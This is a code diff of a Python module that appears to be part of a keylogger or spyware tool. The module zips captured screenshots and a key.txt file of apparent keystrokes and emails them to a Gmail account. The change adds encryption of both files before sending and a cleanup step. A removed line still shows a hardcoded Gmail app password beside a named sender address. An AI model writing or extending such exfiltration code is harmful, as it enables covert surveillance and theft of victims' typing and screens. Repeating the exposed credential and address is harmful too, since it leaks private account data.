@@ -5,6 +5,8 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+
+import Encryption
 import Save_to_file
 import PrintScreen
 
@@ -14,9 +16,11 @@ script_path_key = os.path.join(path, 'key.txt')
 
 
 def sendmail():
+    Encryption.crypt_file(script_path_key)
+
     sender = "Jan.Adamczewski.Pawel@gmail.com"
     receiver = sender
-    password = "vrbf jmke rwrz cwzp"
+    password = ""
     body = "Data: "
 
     msg = MIMEMultipart()
@@ -34,6 +38,7 @@ def sendmail():
     shutil.make_archive("screens", 'zip', "screens")
     zip_path = os.path.join(path, 'screens.zip')
 
+    Encryption.crypt_file(zip_path)
     with open(zip_path, "rb") as file:
         attachment = MIMEBase('application', 'zip')
         attachment.set_payload(file.read())
@@ -57,6 +62,7 @@ def sendmail():
 def clear():
     zip_path = os.path.join(path, 'screens.zip')
     Save_to_file.clear_key()
+    Encryption.clear()
     PrintScreen.clear()
     os.remove(zip_path)
 
